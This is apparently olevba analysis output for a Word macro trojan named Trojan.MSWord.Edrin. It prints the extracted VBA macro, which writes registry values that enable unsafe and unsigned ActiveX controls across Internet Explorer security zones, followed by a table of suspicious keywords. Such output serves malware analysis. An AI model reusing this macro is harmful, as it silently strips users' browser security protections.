olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Edrin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Edrin - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Trojan.MSWord.Edrin - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'this script was written by Edrin@gmx.net
MsgBox "Achtung, Active X Security of Internetexplorer off!!!"
Set WSHShell = CreateObject("WScript.Shell")
For i = 1 To 4
' To trun off localhost-protection(127.0.0.1): i = 0 ()
' Warning: You can´t reset this with options of internet explorer! you have to reset it in registry yourself!!!!!
key = "HKEY_CURRENT_USER\SOFTWARE\MICrosOFT\WINdows\CurrentVersION\Internet settings\Zones\" + chr(i + 48) + "\"
' Chr(49) -> 1 in ASCII
A1 = key + "1405"
A2 = key + "1201"
A3 = key + "1001"
A4 = key + "1004"
WSHShell.RegWrite A1, 0, "REG_DWORD"
WSHShell.RegWrite A2, 0, "REG_DWORD"
WSHShell.RegWrite A3, 0, "REG_DWORD"
WSHShell.RegWrite A4, 0, "REG_DWORD"
Next
MsgBox "Done"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINdows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |127.0.0.1           |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

